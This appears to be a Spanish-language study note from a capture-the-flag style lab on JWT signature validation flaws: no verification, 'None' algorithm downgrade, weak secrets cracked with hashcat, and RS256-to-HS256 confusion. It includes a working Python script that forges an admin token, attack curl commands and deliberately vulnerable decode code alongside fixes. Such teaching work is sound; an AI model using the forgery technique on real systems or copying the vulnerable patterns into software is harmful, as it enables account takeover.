---
layout: apunte
title: "4. Signature Validation Mistakes"
---

El segundo error común con los JWTs es no verificar correctamente la firma. Si la firma no se verifica correctamente, un atacante puede falsificar un token JWT para ganar acceso a la cuenta del usuario.

----------------------------------------
<h2>No Verificar la Firma</h2>
El primer problema con la validación de la firma es cuando no hay validación de la firma. Si el servidor no verifica la firma del JWT, entonces es posible modificar los claims en el JWT a lo que prefieras que sean.

<h4>Ejemplo Práctico 2</h4>
Nos autentificaremos en la API con:

`curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password2" }' http://10.80.190.89/api/v1.0/example2`

Una vez autentificados, podemos ver nuestro usuario con:

`curl -H 'Authorization: Bearer [JWT Token]' http://10.80.190.89/api/v1.0/example2?username=user`

!**Pasted image 20251220155740.png**

Sin embargo, vamos a tratar de autentificarnos sin firma para conseguir ser el usuario que queramos. Para ello, tenemos que modificar la claim de admin y el usuario, tanto del body como de la URL.

!**Pasted image 20251220160034.png**

<h6>El Error de Desarrollo</h4>
En el ejemplo, la firma no se comprueba, como podemos ver debajo:

```python
payload = jwt.decode(token, options={'verify_signature': False})
```

>[!IMPORTANT] Aunque esto es bastante raro en APIs normales, suele ocurrir en las APIs "server-to-server". 

<h6>El Arreglo</h6>
El JWT siempre debería ser validado o deberían usarse factores de autentificación adicionales, como certificados para la comunicación entre servidores. El JWT puede verificarse dando el secreto (o clave pública) como se muestra debajo.

```python
payload = jwt.decode(token, self.secret, algorithms="HS256")
```

-----------------------------------
<h2>Downgrade a None</h2>
Otro problema es el downgrade del algoritmo de firmado. JWT soporta el algoritmo de firmado `None`, que significa que no se usa firma. Aunque parece una idea "tonta", la idea era para la comunicación servidor a servidor, donde la firma del token ya se comprobaba en el proceso de escalado. Si los desarrolladores no requieren verificar el algoritmo, o al menos denegar el algoritmo `None`, puedes cambiar el tipo de algoritmo especificado en el header del JWT, lo que causaría que la librería usada para la verificación siempre devolviera true, permitiendo así falsificar claims del token.

<h4>Ejemplo Práctico 3</h4>
Autentifícate en la API para recibir tu token JWT y verificar tu usuario. Para realizar este ataque, necesitará alterar manualmente el claim `alg` a `None`. Puedes usar [CyberChef](https://gchq.github.io/CyberChef/)  para dicho propósito. Que no se te olvide poner el punto al final.

!**Pasted image 20251220172813.png**

<h6>El Error de Desarrollo</h6>
Aunque parece el mismo problema que antes, desde el punto de vista de desarrollo, es más complejo. A veces, los desarrolladores quieren asegurarse de que su implementación admite varios algoritmos de verificación de firmas. La implementación se leería entonces, normalmente, el header del JWT y parsea el algoritmo encontrado en la verificación del componente.

```python
header = jwt.get_unverified_header(token)

signature_algorithm = header['alg']

payload = jwt.decode(token, self.secret, algorithms=signature_algorithm)
```

El problema es obvio, si ponemos `None` entonces este se convierte en el algoritmo, con los consecuentes problemas. La librería [Pyjwt](https://pyjwt.readthedocs.io/en/stable/), tiene implementado código seguro para prevenir dicho problema.

<h6>El Arreglo</h6>
Si se deben soportar múltiples algoritmos, estos deberían ser declarados en el código como un array.

```python
payload = jwt.decode(token, self.secret, algorithms=["HS256", "HS384", "HS512"])

username = payload['username']
flag = self.db_lookup(username, "flag")
```

------------------------------------
<h2>Secretos Simétricos Débiles</h2>
Si se usa un algoritmo de firmado simétrico, la seguridad del JWT recae en la fortaleza y la entropía del secreto usado. Si se usa un secreto débil, puede ser posible realizar crackeo offline para recuperar el secreto. Una vez el valor secreto se conoce, puedes ganar acceso alterando las claims y recalculando una firma válida.

<h4>Ejemplo Práctico 4</h4>
Para este ejemplo, un secreto débil fue usado para generar el JWT. Una vez obtengas el JWT, tienes varias opciones para romper el secreto. Por ejemplo, puedes usar `hashcat` o `john`.

1. Guarda el JWT en un archivo llamado `jwt.txt`.
   !**Pasted image 20251220181345.png**
2. Descarga una lista de secretos JWT comunes, vamos a usar `wget https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list`.
   !**Pasted image 20251220181524.png**
3. Usamos hashcat para crackear el secret.
   !**Pasted image 20251220182248.png**
4. Ahora construimos el JWT y conseguimos la flag.
   !**Pasted image 20251220185838.png**

<h6>El Error de Desarrollo</h6>
El problema ocurre debido a que el secreto JWT usado es muy débil. Esto puede ocurrir si los desarrolladores tienen prisa o copian código de ejemplos.

<h6>El Arreglo</h6>
Un secreto seguro debe ser utilizado. Este valor será usado en el software y no por humanos, por lo que una string larga y aleatoria debería valer.

---------------------------------------------
<h2>Confusión del Algoritmo de Firmado</h2>
El último problema común con la validación de la firma es cuando se puede realizar un ataque de confusión de algoritmo. Es similar al ataque de downgrade `None`. Sin embargo, pasa específicamente con la confusión entre algoritmos de firmado simétricos y asimétricos. Si se usa un algoritmo asimétrico como RS356, puede ser posible hacer un downgrade del algoritmos a HS256. En estos casos, alguna librerías vuelven por defecto a usar la clave pública como clave simétrica. Como esta es conocida, puedes falsificar el JWT.

<h4>Ejemplo Práctico 5</h4>
Es similar al ejemplo 3. Excepto por que esta vez el algoritmo `None` no está permitido. Sin embargo, una vez que te autentifiques, también recibirás la clave pública. Como la clave pública no se reconoce como información sensible es común que la puedas encontrar. A veces incluso está incrustada como claim en el JWT. En este ejemplo debes downgradear el algoritmo a HS256 y usar la clave pública para falsificar un token.

```python
import base64 
import hmac 
import hashlib 
import json 

def b64url(data): 
	return base64.urlsafe_b64encode(data).decode('utf-8').replace('=', '') 

# 1. Datos 
public_key = "clave_pública" 
header = {"typ": "JWT", "alg": "HS256"} 
payload = {"username": "admin", "admin": 1} 

# 2. Codificar Header y Payload 
json_header = json.dumps(header, separators=(',', ':')).encode() 
json_payload = json.dumps(payload, separators=(',', ':')).encode() 
data_to_sign = b64url(json_header) + "." + b64url(json_payload) 

# 3. Firmar usando la clave pública como secreto HMAC-SHA256 
signature = hmac.new( 
	public_key.encode('utf-8'), 
	data_to_sign.encode('utf-8'), 
	hashlib.sha256 
).digest() 

# 4. Token final 
print(data_to_sign + "." + b64url(signature))
```

Puedes usar este código.

1. Obtenemos el token y la clave pública.
   !**Pasted image 20251220192434.png**
2. Usamos el script de arriba para generar el token.
   !**Pasted image 20251220192510.png**
3. Obtenemos la flag.
   !**Pasted image 20251220192530.png**

<h6>El Error de Desarrollo</h6>
El error en este ejemplo es similar al del ejemplo 3 pero un poco más complejo. Aunque el algoritmo `None` está deshabilitado, el problema principal surge de que se permitan tanto los algoritmos simétricos como los asimétricos.

```python
payload = jwt.decode(token, self.secret, algorithms=["HS256", "HS384", "HS512", "RS256", "RS384", "RS512"])
```

Hay que tener cuidado especial para no permitir mezclar tipos de algoritmos.

<h6>El Arreglo</h6>
Aunque permitamos ambos algoritmos de firmado, se requiere un poco más de lógica para asegurar que no hay confusión, como se muestra en el ejemplo de abajo.

```python
header = jwt.get_unverified_header(token)

algorithm = header['alg']
payload = ""

if "RS" in algorithm:
    payload = jwt.decode(token, self.public_key, algorithms=["RS256", "RS384", "RS512"])
elif "HS" in algorithm:
    payload = jwt.decode(token, self.secret, algorithms=["HS256", "HS384", "HS512"])

username = payload['username']
flag = self.db_lookup(username, "flag")
```

